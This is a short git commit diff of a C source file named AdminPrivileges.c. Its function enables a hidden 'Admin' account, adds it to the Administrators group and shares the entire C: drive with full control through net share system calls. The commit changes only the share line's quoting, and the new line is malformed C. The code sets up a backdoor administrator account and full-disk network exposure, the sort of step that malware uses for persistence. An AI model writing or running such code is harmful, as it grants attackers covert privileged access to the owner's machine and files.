059c56a8ba90d3a4c34889e66344f88cdcbf5baa
GlebYoutuber <73891760+GlebYoutuber@users.noreply.github.com>
2021-11-25 17:30:27 +0300

    Update AdminPrivileges.c

--- src_code/AdminPrivileges.c
+++ src_code/AdminPrivileges.c
@@ -4,5 +4,5 @@ int adminprivileges(void)
 {
 	system("net user Admin /active:yes");
 	system("net localgroup Administrators Admin /add");
-	system("net share SHARE_NAME=c:\ /grant:Admin,full");
+	system("net share SHARE_NAME="C:\" /grant:Admin,full");
 }
